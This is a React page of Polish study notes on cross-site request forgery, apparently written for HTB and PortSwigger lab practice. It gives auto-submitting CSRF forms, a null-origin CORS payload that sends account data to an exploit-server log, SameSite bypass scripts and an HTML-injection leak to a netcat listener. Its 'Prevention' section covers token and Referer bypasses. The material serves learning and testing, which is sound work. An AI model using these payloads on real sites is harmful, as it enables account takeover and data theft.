import csrf_example from '../../../assets/csrf_example.png';
import csrf_result from '../../../assets/csrf_result.png';
import csrf_example_get from '../../../assets/csrf_example_get.png';
import csrf_example_url from '../../../assets/csrf_example_url.png';
import csrf_post_result from '../../../assets/csrf_post_result.png';
import csrf_defense from '../../../assets/csrf_defense.png';
import csrf_open_redirect from '../../../assets/csrf_open_redirect.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const CSRF = () =>{
    return(
        <section>
                <h1>Cross-Site Request Forgery (CSRF)</h1>

                <details>
                    <summary>Formularz na postawie requesta</summary>
                    <ExampleFrame screen={csrf_example} />
                    <div className='waring'>
                        <p>{`<html>`}</p>
                        <p className='tab-1'>{`<body>`}</p>
                        <p className='tab-2'>{`<form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">`}</p>
                        <p className='tab-3'>{`<input type="hidden" name="email" value="attacker@htb.net" />`}</p>
                        <p className='tab-3'>{`<input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />`}</p>
                        <p className='tab-3'>{`<input type="hidden" name="country" value="CSRF_POC" />`}</p>
                        <p className='tab-3'>{`<input type="submit" value="Submit request" />`}</p>
                        <p className='tab-2'>{`</form>`}</p>
                        <p className='tab-2'>{`<script>`}</p>
                        <p className='tab-3'>{`document.getElementById("submitMe").submit()`}</p>
                        <p className='tab-2'>{`</script>`}</p>
                        <p className='tab-1'>{`</body>`}</p>
                        <p>{`</html>`}</p>
                    </div>
                    <p>Następnie włączamy naszą aplikację w przeglądarce<span className='important'>python -m http.server 1337</span> -{`>`} <span className='important'>{`http://<VPN/TUN Adapter IP>:1337/notmalicious.html`}</span></p>
                    <ExampleFrame screen={csrf_result} />
                </details>

                <hr />

                <details>
                    <summary>Origin</summary>
                    <p>Podczas wdrażania białych list pochodzenia CORS często pojawiają się błędy. Niektóre organizacje decydują się na umożliwienie dostępu ze wszystkich swoich subdomen (w tym przyszłych subdomen, które jeszcze nie istnieją). Niektóre aplikacje umożliwiają dostęp z domen różnych innych organizacji, w tym ich subdomen. Reguły te są często implementowane poprzez dopasowywanie przedrostków lub sufiksów adresów URL lub przy użyciu wyrażeń regularnych. Wszelkie błędy we wdrożeniu mogą skutkować przyznaniem dostępu niezamierzonym domenom zewnętrznym.</p>
                    <div className='waring'>
                        <p>normal-website.com</p>
                        <p><span className='important'>hackers</span>normal-website.com</p>
                        <p>normal-website.com<span className='important'>.evil-user.net</span></p>
                    </div>
                    <h2>Whitelisted null origin value</h2>
                    <p>Specyfikacja nagłówka Origin obsługuje wartość null. Przeglądarki mogą wysyłać wartość null w nagłówku Origin w różnych nietypowych sytuacjach:</p>
                    <p className='important'>Cross-origin redirects. - Przekierowania między źródłami.</p>
                    <p className='important'>Requests from serialized data. - Żądania z danych serializowanych.</p>
                    <p className='important'>Request using the file: protocol. - Zapytanie przy użyciu pliku: protokół.</p>
                    <p className='important'>Sandboxed cross-origin requests. - Żądania między źródłami w trybie piaskownicy.</p>
                    <div className='waring'>
                        <p>{`<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>`}</p>
                        <p className='tab-1'>var req = new XMLHttpRequest();</p>
                        <p className='tab-1'>req.onload = reqListener;</p>
                        <p className='tab-1'>req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);</p>
                        <p className='tab-1'>req.withCredentials = true;</p>
                        <p className='tab-1'>req.send();</p>
                        <p className='tab-1'>{`function reqListener() {`}</p>
                        <p className='tab-2'>location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);</p>
                        <p className='tab-1'>{`};`}</p>
                        <p>{`</script>"></iframe>`}</p>
                    </div>

                    <h2>Wykorzystywanie XSS poprzez relacje zaufania CORS</h2>
                    <div className='waring'>
                        <p>Request:</p>
                        <br />
                        <p>GET /api/requestApiKey HTTP/1.1</p>
                        <p>Host: vulnerable-website.com</p>
                        <p>Origin: https://subdomain.vulnerable-website.com</p>
                        <p>Cookie: sessionid=...</p>
                    </div>
                    <div className='waring'>
                        <p>Response:</p>
                        <br />
                        <p>HTTP/1.1 200 OK</p>
                        <p>Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com</p>
                        <p>Access-Control-Allow-Credentials: true</p>
                    </div>

                    <div className='waring'>
                        <p>https://subdomain.vulnerable-website.com/<span className='important'>{`?xss=<script>cors-stuff-here</script>`}</span></p>
                    </div>

                    <h2>Access-Control-Allow-Credentials: true</h2>
                    <p>Bez tego nagłówka przeglądarka ofiary <u className='important'>odmówi wysłania plików cookie</u>, co oznacza, że ​​osoba atakująca uzyska dostęp jedynie do nieuwierzytelnionych treści, do których mogłaby uzyskać równie łatwy dostęp, przeglądając bezpośrednio docelową witrynę internetową.</p>
                </details>

                <hr />

                <details>
                    <summary>Referrer</summary>
                    <p>Niektóre aplikacje sprawdzają nagłówek Referer, jeśli jest on obecny w żądaniach, ale pomijają weryfikację, jeśli nagłówek zostanie pominięty.</p>
                    <div className='waring'>
                        <p>{`<meta name="referrer" content="no-referrer">`}</p>
                    </div>
                </details>

                <hr />

                <details>
                    <summary>SameSite cookie restrictions</summary>
                    <h2>Różnica między SameSite, a Origin</h2>
                    <p>Jeśli witryna wydająca plik cookie nie ustawi jawnie atrybutu SameSite, <u className='important'>Chrome domyślnie</u> automatycznie zastosuje ograniczenia <u className='important'>Lax</u>.</p>
                    <ul>
                        <li><span className='important'>SameSite=Strict</span> Jeśli plik cookie ma ustawiony atrybut SameSite=Strict, przeglądarki nie będą go wysyłać w żadnych żądaniach między witrynami. Mówiąc najprościej, oznacza to, że jeśli witryna docelowa żądania nie odpowiada witrynie aktualnie wyświetlanej w pasku adresu przeglądarki, 
                        plik cookie nie zostanie uwzględniony. Jest to zalecane w przypadku ustawiania plików cookie, które umożliwiają użytkownikowi modyfikowanie danych lub wykonywanie innych wrażliwych działań, takich jak dostęp do określonych stron, które są dostępne tylko dla uwierzytelnionych użytkowników.
                            <div className='waring'>Jednym z możliwych gadżetów jest przekierowanie po stronie klienta, które dynamicznie konstruuje cel przekierowania przy użyciu danych wejściowych kontrolowanych przez osobę atakującą, takich jak <u className='important'>parametry adresu URL</u>. Kilka przykładów znajdziesz w naszych materiałach na temat otwartego przekierowania opartego na DOM.
                                <p>{`<script>`}</p>
                                <p className='tab-1'>{`document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=`}<span className='important'>1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1</span><span>{`";`}</span></p>
                                <p>{`</script>`}</p>
                            </div>
                        </li>
                        <li><span className='important'>SameSite=Lax</span> SameSite oznaczają, że przeglądarki będą wysyłać plik cookie w żądaniach między witrynami, ale tylko wtedy, gdy zostaną spełnione oba poniższe warunki:
                            <br /><span className='important tab-1'>W żądaniu zastosowano metodę GET.</span>
                            <br /><span className='important tab-1'>Żądanie wynikało z nawigacji użytkownika na najwyższym poziomie, np. kliknięcia linku.</span>
                            <br />Oznacza to, że plik cookie nie jest uwzględniany na przykład w żądaniach POST przesyłanych między witrynami. Ponieważ żądania POST są zwykle używane do wykonywania działań modyfikujących dane lub stan (przynajmniej zgodnie z najlepszymi praktykami), znacznie częściej stają się celem ataków CSRF.
                            <p>Jak wspomniano wcześniej, jeśli witryna nie zawiera atrybutu SameSite podczas ustawiania pliku cookie, Chrome automatycznie domyślnie stosuje ograniczenia Lax. Aby jednak uniknąć złamania mechanizmów pojedynczego logowania (SSO), w rzeczywistości nie wymusza to stosowania tych ograniczeń przez <u className='important'>pierwsze 120 sekund w przypadku żądań POST najwyższego poziomu</u>. W rezultacie istnieje dwuminutowe okno, w którym użytkownicy mogą być podatni na ataki między witrynami.</p>
                            <div className='waring'>
                                <p>window.open('https://vulnerable-website.com/login/sso');</p>
                            </div>
                            <div className='waring'>
                                <p>{`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">`}</p>
                                <p className='tab-1'>{`<input type="hidden" name="email" value="pwned@portswigger.net">`}</p>
                                <p>{`</form>`}</p>
                                <p>{`<script>`}</p>
                                <p className='tab-1'>{`window.onclick = () => {`}</p>
                                <p className='tab-2'>window.open('https://vulnerable-website.com/login/sso');</p>
                                <p className='tab-2'>setTimeout(changeEmail, 5000);</p>
                                <p className='tab-1'>{`}`}</p>
                                <p className='tab-1'>{`function changeEmail() {`}</p>
                                <p className='tab-2'>{`document.forms[0].submit();`}</p>
                                <p className='tab-1'>{`}`}</p>
                                <p>{`</script>`}</p>
                            </div>
                            <div className='waring'>
                                <p>Przerobienie metody POST by przeszła przex SameSite=Lax</p>
                                <p>Domyślny url zmiany</p>
                                <p>POST /my-account/change-email</p>
                                <p>Przerobiony na GET wraz z parametrem</p>
                                <p>GET /my-account/change-email<span className='important'>?email=foo%40web-security-academy.net</span></p>
                                <p>Nadpisanie metody</p>
                                <p>GET /my-account/change-email?email=foo%40web-security-academy.net<span className='important'>&_method=POST</span></p>
                            </div>
                        </li>
                        <li><span className='important'>SameSite=None</span> całkowicie wyłącza to ograniczenia SameSite, niezależnie od przeglądarki. W rezultacie przeglądarki będą wysyłać ten plik cookie we wszystkich żądaniach kierowanych do witryny, która go wygenerowała, nawet w tych, które zostały wywołane przez zupełnie niepowiązane witryny stron trzecich.
                            <u className='important'>Z wyjątkiem przeglądarki Chrome</u> jest to domyślne zachowanie stosowane przez główne przeglądarki, jeśli podczas ustawiania pliku cookie nie podano atrybutu SameSite.
                            Istnieją uzasadnione powody wyłączenia SameSite, na przykład gdy plik cookie jest przeznaczony do użycia w kontekście strony trzeciej i nie zapewnia użytkownikowi dostępu do żadnych wrażliwych danych ani funkcji. Typowym przykładem są śledzące pliki cookie.
                            <u>W przypadku ustawienia pliku cookie z wartością SameSite=None witryna internetowa musi także zawierać atrybut Secure, który gwarantuje, że plik cookie będzie wysyłany wyłącznie w zaszyfrowanych wiadomościach za pośrednictwem protokołu HTTPS. W przeciwnym razie przeglądarki odrzucą plik cookie i nie zostanie on zapisany.</u>
                            <div className='waring'>Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; <span className='important'>Secure</span></div>
                        </li>
                    </ul>
                    <div className='waring'>
                        <p>Podobnie plik cookie nie jest uwzględniany w żądaniach w tle, takich jak te inicjowane przez <u className='important'>skrypty, ramki iframe lub odniesienia do obrazów i innych zasobów.</u></p>
                    </div>
                    <div className='waring'>
                        <p>Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; <span className='important'>SameSite=Strict</span></p>
                    </div>

                    <div className='waring'>
                        <p>{`<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">`}</p>
                        <p className='tab-1'><span className='important'>{`<input type="hidden" name="_method" value="GET">`}</span></p>
                        <p className='tab-1'>{`<input type="hidden" name="recipient" value="hacker">`}</p>
                        <p>{`</form>`}</p>
                    </div>

                    <table class="is-nonresponsive-table">
                        <tbody>
                        <tr>
                            <td>
                                <strong>Request from</strong>
                            </td>
                            <td>
                                <strong>Request to</strong>
                            </td>
                            <td>
                                <strong>Same-site?</strong>
                            </td>
                            <td>
                                <strong>Same-origin?</strong>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <code>https://example.com</code>
                            </td>
                            <td>
                                <code>https://example.com</code>
                            </td>
                            <td>
                                Yes
                            </td>
                            <td>
                                Yes
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <code>https://app.example.com</code>
                            </td>
                            <td>
                                <code>https://intranet.example.com</code>
                            </td>
                            <td>
                                Yes
                            </td>
                            <td>
                                No: niedopasowana nazwa domeny
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <code>https://example.com</code>
                            </td>
                            <td>
                                <code>https://example.com:8080</code>
                            </td>
                            <td>
                                Yes
                            </td>
                            <td>
                                No: niedopasowany port
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <code>https://example.com</code>
                            </td>
                            <td>
                                <code>https://example.co.uk</code>
                            </td>
                            <td>
                                No: niedopasowana eTLD
                            </td>
                            <td>
                                No: niedopasowana nazwa domeny
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <code>https://example.com</code>
                            </td>
                            <td>
                                <code>http://example.com</code>
                            </td>
                            <td>
                                No: niedopasowany scheme
                            </td>
                            <td>
                                No: niedopasowana scheme
                            </td>
                        </tr>
                    </tbody>
                    </table>
                </details>

                <hr />

                <details>
                    <summary>Oparty na GET</summary>
                    <ExampleFrame screen={csrf_example_get} />
                    <div className='waring'>
                        <p>{`<html>`}</p>
                        <p className='tab-1'>{`<body>`}</p>
                        <p className='tab-2'>{`<form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">`}</p>
                        <p className='tab-3'>{`<input type="hidden" name="email" value="attacker@htb.net" />`}</p>
                        <p className='tab-3'>{`<input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />`}</p>
                        <p className='tab-3'>{`<input type="hidden" name="country" value="CSRF_POC" />`}</p>
                        <p className='tab-3'>{`<input type="hidden" name="action" value="save" />`}</p>
                        <p className='tab-3'>{`<input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />`}</p>
                        <p className='tab-3'>{`<input type="submit" value="Submit request" />`}</p>
                        <p className='tab-2'>{`</form>`}</p>
                        <p className='tab-2'>{`<script>`}</p>
                        <p className='tab-3'>{`document.getElementById("submitMe").submit()`}</p>
                        <p className='tab-2'>{`</script>`}</p>
                        <p className='tab-1'>{`</body>`}</p>
                        <p>{`</html>`}</p>
                    </div>
                </details>

                <hr />

                <details>
                    <summary>Oparty na POST/ Delete</summary>
                    <ExampleFrame screen={csrf_example_url} />
                    <p>Zmieńmy element HTML na <span className='important'>{`<h1>h1<u>underline<%2fu><%2fh1>`}</span></p>
                    <div className='waring'>
                        <p>Wprowadzamy Payload który dostarczy nam dane</p>
                        <p><span className='important'>{`<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f`}</span></p>
                        <p>Oraz odpalamy serwer lokalnie</p>
                        <p><span className='important'>nc -nlvp 8000</span></p>
                    </div>
                    <ExampleFrame screen={csrf_post_result} />
                </details>

                <hr />

                <details>
                    <summary>Open Redirect</summary>
                    <ul className='important'>
                        <li>?url=</li>
                        <li>?link=</li>
                        <li>?redirect=</li>
                        <li>?redirecturl=</li>
                        <li>?redirect_uri=</li>
                        <li>?return=</li>
                        <li>?return_to=</li>
                        <li>?returnurl=</li>
                        <li>?go=</li>
                        <li>?goto=</li>
                        <li>?exit=</li>
                        <li>?exitpage=</li>
                        <li>?fromurl=</li>
                        <li>?fromuri=</li>
                        <li>?redirect_to=</li>
                        <li>?next=</li>
                        <li>?newurl=</li>
                        <li>?redir=</li>
                    </ul>

                    <p>W przypadku zobaczenia takich url <span className='important'>{`http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>`}</span>, możemy zmienić na <span>{`http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>`}</span></p>
                    <div className='waring'>
                        <p><span className='important'>{`<RANDOM TOKEN ASSIGNED BY THE APP>`}</span>{`<`}-- Zastąp to tokenem, który jest przydzielany automatycznie przez aplikację.</p>
                    </div>
                    <ExampleFrame screen={csrf_open_redirect} />
                </details>

                <hr />

                <details className='defense'>
                    <summary>Zapobieganie</summary>
                    <p className='defense'>Ustawienie wartości tokena CSRF na tę samą długość, co oryginalny token CSRF, ale z inną/losową wartością, może również ominąć pewne zabezpieczenia anty-CSRF, które sprawdzają, czy token ma wartość i długość tej wartości. Na przykład, jeśli token CSRF miałby długość 32 bajtów, utworzylibyśmy ponownie token 32-bajtowy.</p>
        
                    <h3 className='defense'>Usuń parametr tokena CSRF lub wyślij pusty token</h3>
                    <p className='defense'>Niewysłanie tokena działa dość często z powodu następującego częstego błędu logiki aplikacji. Aplikacje czasami sprawdzają ważność tokenu tylko wtedy, gdy token istnieje lub jeśli parametr tokenu nie jest pusty.</p>
                    <ExampleFrame screen={csrf_defense} />

                    <h3 className='defense'>Ochrona anty-CSRF poprzez nagłówek strony odsyłającej</h3>
                    <p className='defense'>Jeśli aplikacja używa nagłówka strony odsyłającej jako mechanizmu zabezpieczającego przed CSRF, możesz spróbować usunąć nagłówek strony odsyłającej. Dodaj następujący metatag do swojej strony hostującej skrypt CSRF.</p>
                    <p className='important'>{`<meta name="referrer" content="no-referrer"`}</p>
                </details>

        </section>
    )
}

export default CSRF;